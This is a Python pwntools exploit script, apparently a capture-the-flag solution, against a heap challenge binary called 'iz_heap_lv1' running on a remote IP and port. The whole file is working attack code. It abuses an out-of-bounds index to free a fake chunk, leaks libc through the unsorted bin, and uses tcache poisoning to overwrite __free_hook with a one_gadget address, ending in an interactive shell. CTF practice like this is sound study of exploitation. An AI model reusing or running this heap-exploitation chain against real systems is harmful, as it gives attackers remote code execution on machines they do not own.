#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

BIN_NAME     = "./iz_heap_lv1"
LIBC_NAME    = "./libc.so.6"

HOST         = "165.22.110.249"
PORT         = 3333

def add(size, data):
    p.sendlineafter('Choice:', '1')
    p.sendlineafter('size:', str(size))
    p.sendafter('data:', data)

def edit(index, size, data):
    p.sendlineafter('Choice:', '2')
    p.sendlineafter('index:', str(index))
    p.sendlineafter('size:', str(size))
    p.sendafter('data:', data)

def delete(index):
    p.sendlineafter('Choice:', '3')
    p.sendlineafter('index:', str(index))

def show_name(edit, name=""):
    p.sendlineafter('Choice:', '4')
    if edit:
        p.sendlineafter('(Y/N)', 'Y')
        p.sendafter('name:', name)
    else:
        p.sendlineafter('(Y/N)', 'N')
    p.recvuntil('Name: ')
    return p.recvuntil('\n',drop=True)

def exploit(p):

    name_addr = 0x602100

    name = fit({
        0:                  name_addr + 0x20,
        # fake chunk start
        0x18:               p64(0x91),
        0x18 + 0x90:        p64(0x21),
        0x18 + 0x90 + 0x20: p64(0x21)
    }, filler='\x00')

    p.sendlineafter('Input name:', name)

    # Fill up the tcache bin list
    for i in range(7):
        add(0x80, 'AAAA')

    for i in range(7):
        delete(i)

    # Index goes from 0 to 19 included. Thanks to bad checks we can index
    # outside of it. Index 20 corresponds to the name data

    delete(20)

    # Fill data until the fake chunk fd ptr
    leak = show_name(True, 'A'*0x20)
    leak = u64(leak[0x20:].ljust(8,'\x00'))

    libc_base  = leak - 0x3ebca0
    free_hook  = libc_base + libc.symbols['__free_hook']
    one_gadget = libc_base + 0x4f322

    log.info('Libc        @ ' + hex(libc_base))
    log.info('__free_hook @ ' + hex(free_hook))
    log.info('one_gadget  @ ' + hex(one_gadget))

    # Use another size so we don't mess with the already used tcache
    name = fit({
        0:    name_addr + 0x20,
        # fake chunk start
        0x18: p64(0x31)
    }, filler='\x00')

    show_name(True, name)

    delete(20)

    add(0x20, 'AAAA') # tcache   0x602120
    add(0x20, 'AAAA') # unsorted 0x602120

    delete(0)

    name = fit({
        0:          name_addr + 0x20,
        # fake chunk start
        0x18:       p64(0x31),
        0x18 + 0x8: p64(free_hook)
    }, filler='\x00')

    show_name(True, name)

    # tcache poison
    # keep the fd value to free_hook
    add(0x20, p64(free_hook)) # tcache entry
    add(0x20, p64(one_gadget)) # writting to free_hook

    delete(1)

    p.interactive()

if __name__ == "__main__":

    libc = ELF(LIBC_NAME)
    env  = dict(LD_PRELOAD = LIBC_NAME)

    # p = process(BIN_NAME, env=env)
    p = remote(HOST, PORT)

    exploit(p)
